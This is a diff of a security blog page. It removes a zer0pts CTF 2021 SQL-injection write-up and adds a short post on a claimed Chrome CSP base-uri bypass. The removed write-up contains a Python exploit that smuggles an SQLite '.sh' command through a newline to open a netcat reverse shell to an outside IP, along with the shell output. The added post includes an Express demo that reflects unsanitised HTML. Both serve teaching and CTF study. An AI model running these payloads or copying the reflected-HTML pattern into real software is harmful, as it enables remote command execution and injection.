@@ -35,24 +35,24 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="zer0pts CTF 2021 Baby SQLi Write Up" />
+<meta property="og:title" content="CSP base-uri can be bypassed (Chrome in 2025???)" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="This article is about write-up for the zer0pts CTF 2021. there is only one web challenge, which contain SQL Injection bug" />
-<meta property="og:description" content="This article is about write-up for the zer0pts CTF 2021. there is only one web challenge, which contain SQL Injection bug" />
-<link rel="canonical" href="http://localhost:4000/posts/Zer0pts/" />
-<meta property="og:url" content="http://localhost:4000/posts/Zer0pts/" />
+<meta name="description" content="What is base-uri the base-uri directive controls which urls can be used in the &lt;base&gt; element of an html document. without it, an attacker could inject a tag and change how all relative urls (scripts, images, css, links, forms) are resolved" />
+<meta property="og:description" content="What is base-uri the base-uri directive controls which urls can be used in the &lt;base&gt; element of an html document. without it, an attacker could inject a tag and change how all relative urls (scripts, images, css, links, forms) are resolved" />
+<link rel="canonical" href="http://localhost:4000/posts/chrome-bypass-csp/" />
+<meta property="og:url" content="http://localhost:4000/posts/chrome-bypass-csp/" />
 <meta property="og:site_name" content="Web2.0" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-03-09T08:29:53+09:00" />
+<meta property="article:published_time" content="2025-09-07T09:03:31+09:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="zer0pts CTF 2021 Baby SQLi Write Up" />
+<meta property="twitter:title" content="CSP base-uri can be bypassed (Chrome in 2025???)" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-03-09T08:29:53+09:00","datePublished":"2021-03-09T08:29:53+09:00","description":"This article is about write-up for the zer0pts CTF 2021. there is only one web challenge, which contain SQL Injection bug","headline":"zer0pts CTF 2021 Baby SQLi Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Zer0pts/"},"url":"http://localhost:4000/posts/Zer0pts/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-07T09:03:31+09:00","datePublished":"2025-09-07T09:03:31+09:00","description":"What is base-uri the base-uri directive controls which urls can be used in the &lt;base&gt; element of an html document. without it, an attacker could inject a tag and change how all relative urls (scripts, images, css, links, forms) are resolved","headline":"CSP base-uri can be bypassed (Chrome in 2025???)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/chrome-bypass-csp/"},"url":"http://localhost:4000/posts/chrome-bypass-csp/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>zer0pts CTF 2021 Baby SQLi Write Up | Web2.0
+  <title>CSP base-uri can be bypassed (Chrome in 2025???) | Web2.0
   </title>
 
   <!--
@@ -561,7 +561,7 @@
         
           
             
-              <span>zer0pts CTF 2021 Baby SQLi Write Up</span>
+              <span>CSP base-uri can be bypassed (Chrome in 2025???)</span>
             
 
           
@@ -629,6 +629,85 @@
 
 
 
+  
+  
+
+  <!-- CDN URL -->
+  
+
+  <!-- Add image path -->
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
 
 <!-- Add header for code snippets -->
 
@@ -644,11 +723,6 @@
   
 
   
-
-  
-  
-
-  
     
     
 
@@ -667,8 +741,24 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
 
     
+  
+
+  
+  
+
   
 
   
@@ -691,7 +781,7 @@
 
 <article class="px-1">
   <header>
-    <h1 data-toc-skip>zer0pts CTF 2021 Baby SQLi Write Up</h1>
+    <h1 data-toc-skip>CSP base-uri can be bypassed (Chrome in 2025???)</h1>
 
     <div class="post-meta text-muted">
       <!-- published date -->
@@ -707,13 +797,13 @@
 
 <time
   
-  data-ts="1615246193"
+  data-ts="1757203411"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Mar  9, 2021
+  Sep  7, 2025
 </time>
 
       </span>
@@ -758,9 +848,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="498 words"
+  title="286 words"
 >
-  <em>2 min</em> read</span>
+  <em>1 min</em> read</span>
 
       </div>
       <!-- .d-flex -->
@@ -769,64 +859,48 @@
   </header>
 
   <div class="content">
-    <h3 id="web-baby-sqli-170-pts"><span class="me-2">(Web) Baby SQLi [170 pts]</span><a href="#web-baby-sqli-170-pts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-
-<blockquote>
-  <p>Baby SQLi challenge is bypass of waf and using shell command.</p>
-</blockquote>
-
-<p>First, You can using <code class="language-plaintext highlighter-rouge">.system/.shell/.sh</code> command and execute shell command in SQLite3</p>
+    <h2 id="what-is-base-uri"><span class="me-2">What is base-uri</span><a href="#what-is-base-uri" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>the base-uri directive controls which urls can be used in the &lt;base&gt; element of an html document. without it, an attacker could inject a <base /> tag and change how all relative urls (scripts, images, css, links, forms) are resolved</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-</pre></td><td class="rouge-code"><pre>// SQLite3 CLI
-sqlite&gt; .sh id|nc 141.164.52.207 2
-
-// Terminal
-root@py:~# nc -lp 2
-uid=0(root) gid=0(root) groups=0(root)
+</pre></td><td class="rouge-code"><pre>content-security-policy: base-uri 'self'
 </pre></td></tr></tbody></table></code></div></div>
-<p>As above, you can see in sqlite3 executes a shell command using the <code class="language-plaintext highlighter-rouge">.sh</code> command.</p>
+<ul>
+  <li>‘self’ → only allow the same origin</li>
+  <li>specific urls → only allow those hosts</li>
+  <li>‘none’ → completely disallow &lt;base&gt; tags</li>
+</ul>
 
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">sqlite3_query</span><span class="p">(</span><span class="n">sql</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">([</span><span class="sh">'</span><span class="s">sqlite3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">database.db</span><span class="sh">'</span><span class="p">],</span>
-                         <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
-                         <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
-                         <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
-    <span class="n">o</span><span class="p">,</span> <span class="n">e</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">communicate</span><span class="p">(</span><span class="n">sql</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
-    <span class="k">if</span> <span class="n">e</span><span class="p">:</span>
-        <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">o</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">):</span>
-        <span class="k">if</span> <span class="n">row</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span> <span class="k">break</span>
-        <span class="n">result</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">tuple</span><span class="p">(</span><span class="n">row</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">|</span><span class="sh">'</span><span class="p">)))</span>
-    <span class="k">return</span> <span class="n">result</span>
+</pre></td><td class="rouge-code"><pre>content-security-policy: base-uri 'self'
 </pre></td></tr></tbody></table></code></div></div>
-<p>Looking at the source code, you can line jump using the <code class="language-plaintext highlighter-rouge">\n</code> character because using the <code class="language-plaintext highlighter-rouge">communicate()</code> in <code class="language-plaintext highlighter-rouge">subporcess.Popen()</code> in <code class="language-plaintext highlighter-rouge">sqlite3_query()</code>.</p>
+<p>prevents &lt;base href=”https://evil.com/”&gt; from working</p>
 
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>content-security-policy: base-uri https://cdn.example.com
+</pre></td></tr></tbody></table></code></div></div>
+<p>only &lt;base href=”https://cdn.example.com/”&gt; is valid</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>content-security-policy: base-uri 'none'
+</pre></td></tr></tbody></table></code></div></div>
+<p>any &lt;base&gt; tag will be ignored</p>
+
+<p>so if an attacker injects a malicious &lt;base href=”https://evil.com/”&gt; all relative links (like /login, /script.js) could redirect or load from their server.
+base-uri blocks this and helps protect against script injection, phishing, and data exfiltration</p>
+
+<h2 id="how-it-can-be-bypassed"><span class="me-2">How it can be bypassed</span><a href="#how-it-can-be-bypassed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -850,141 +924,47 @@ uid=0(root) gid=0(root) groups=0(root)
 21
 22
 23
-</pre></td><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">post</span><span class="sh">'</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">auth</span><span class="p">():</span>
-    <span class="n">username</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">''</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
-    <span class="n">password</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">''</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
-    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">32</span> <span class="ow">or</span> <span class="nf">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">32</span><span class="p">:</span>
-        <span class="n">flask</span><span class="p">.</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">msg</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Too long username or password</span><span class="sh">'</span>
-        <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="n">flask</span><span class="p">.</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">5555</span><span class="p">;</span>
 
-    <span class="n">password_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">()</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="bp">None</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">result</span> <span class="o">=</span> <span class="nf">sqlite3_query</span><span class="p">(</span>
-            <span class="sh">'</span><span class="s">SELECT * FROM users WHERE username=</span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s"> AND password=</span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s">;</span><span class="sh">'</span>
-            <span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">sqlite3_escape</span><span class="p">(</span><span class="n">username</span><span class="p">),</span> <span class="n">password_hash</span><span class="p">)</span>
-        <span class="p">)</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">pass</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Security-Policy</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">base-uri 'none'</span><span class="dl">"</span><span class="p">);</span>
+  <span class="nf">next</span><span class="p">();</span>
+<span class="p">});</span>
 
-    <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
-        <span class="n">flask</span><span class="p">.</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">flask</span><span class="p">.</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">msg</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Invalid Credential</span><span class="sh">'</span>
-    <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="n">flask</span><span class="p">.</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>And looking at the source code in login logic, you can see that <code class="language-plaintext highlighter-rouge">username</code>/<code class="language-plaintext highlighter-rouge">password</code> value is input, the length is verified, and it is put in query statement and at this point, you can see that the <code class="language-plaintext highlighter-rouge">username</code> value is escaped. but, you don’t worry because treats escape characters as simple string is sqlite3.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>SELECT * FROM users where username = "\" or 1=1 -- " and password = "pocas";
-</pre></td></tr></tbody></table></code></div></div>
-<p>In other words, It doensn’t matter if it escaped as above.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>SELECT * FROM users where username = "\";
-.sh id|nc 141.164.52.207 2;
-and password = "pocas";
-</pre></td></tr></tbody></table></code></div></div>
-<p>So, you can use shell command by doing line jumps as above and using the .sh command.</p>
-
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
-
-<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://web.ctf.zer0pts.com:8004</span><span class="sh">"</span>
-<span class="n">username</span> <span class="o">=</span> <span class="sh">'"</span><span class="s">;</span><span class="se">\n</span><span class="s">.sh id|nc 2376348879 2</span><span class="se">\n</span><span class="sh">'</span>
-<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">pocas</span><span class="sh">"</span><span class="p">}</span>
-<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-</pre></td></tr></tbody></table></code></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>root@py:~# nc -lp 2
-uid=1000(app) gid=1000(app)
-root@py:~#
-</pre></td></tr></tbody></table></code></div></div>
-<p>If you write the exploit code as above, close <code class="language-plaintext highlighter-rouge">SELECT</code> statemnt and in the line immediately underneath execute <code class="language-plaintext highlighter-rouge">.sh</code> command.</p>
-
-<div class="language-python highlighter-rouge"><div class="code-header">
-        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
-
-<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://web.ctf.zer0pts.com:8004</span><span class="sh">"</span>
-<span class="n">username</span> <span class="o">=</span> <span class="sh">'"</span><span class="s">;</span><span class="se">\n</span><span class="s">.sh nc 2376348879 2 -e sh</span><span class="se">\n</span><span class="sh">'</span>
-<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">pocas</span><span class="sh">"</span><span class="p">}</span>
-<span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-</pre></td></tr></tbody></table></code></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-</pre></td><td class="rouge-code"><pre>root@py:~# nc -lvnp 2
-Listening on 0.0.0.0 2
-Connection received on 165.227.180.221 38761
-id
-uid=1000(app) gid=1000(app)
-cat templates/index.html
-&lt;!DOCTYPE html&gt;
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">html</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">html</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">html</span><span class="dl">"</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="s2">`&lt;!doctype html&gt;
 &lt;html&gt;
-    &lt;head&gt;
-        &lt;meta charset="UTF-8"&gt;
-        &lt;title&gt;Welcome&lt;/title&gt;
-    &lt;/head&gt;
+&lt;head&gt;
+  &lt;meta charset="utf-8"&gt;
+  &lt;title&gt;CSP base-uri demo&lt;/title&gt;
+&lt;/head&gt;
+&lt;body style="font-family:system-ui;line-height:1.4"&gt;
+  &lt;div id="injected"&gt;</span><span class="p">${</span><span class="nx">html</span><span class="p">}</span><span class="s2">&lt;/div&gt;
+  &lt;img src="/103fj3oeqdnf91o3gjm"&gt;
+&lt;/body&gt;
+&lt;/html&gt;`</span><span class="p">);</span>
+<span class="p">});</span>
 
-    &lt;body&gt;
-        &lt;h1&gt;Welcome, !&lt;/h1&gt;
-        
-        &lt;p&gt;No flag for you :(&lt;/p&gt;
-        
-    &lt;/body&gt;
-&lt;/html&gt;
+<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`up on http://127.0.0.1:</span><span class="p">${</span><span class="nx">PORT</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="c1">// http://localhost:5555/?html=%3Cbase%20href=//google.com%3E%3Cimg%20src=%22/xxd%22%3E</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p>Final, I pass the shell using <code class="language-plaintext highlighter-rouge">e</code> option about <code class="language-plaintext highlighter-rouge">nc</code> and read <code class="language-plaintext highlighter-rouge">index.html</code> and saw the flag.</p>
+<p>there is a server with base-uri set to none</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>FLAG : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}
-</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/img/2025/ASISCTF/1.png" class="popup img-link  shimmer"><img src="/assets/img/2025/ASISCTF/1.png" alt="" loading="lazy"></a></p>
+
+<p>when visting the page, it is expected that the &lt;base&gt; tag will not be applied due to the csp. however, when actually visiting the link, it seems that before the csp is enforced, the tags are loaded and a request is being sent to google.com</p>
+
+<p>idk why it happened, it’s just crazy</p>
 
   </div>
 
@@ -1036,21 +1016,21 @@ cat templates/index.html
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=zer0pts%20CTF%202021%20Baby%20SQLi%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FZer0pts%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=CSP%20base-uri%20can%20be%20bypassed%20(Chrome%20in%202025???)%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fchrome-bypass-csp%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=zer0pts%20CTF%202021%20Baby%20SQLi%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FZer0pts%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=CSP%20base-uri%20can%20be%20bypassed%20(Chrome%20in%202025???)%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fchrome-bypass-csp%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FZer0pts%2F&text=zer0pts%20CTF%202021%20Baby%20SQLi%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fchrome-bypass-csp%2F&text=CSP%20base-uri%20can%20be%20bypassed%20(Chrome%20in%202025???)%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -1185,283 +1165,283 @@ cat templates/index.html
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
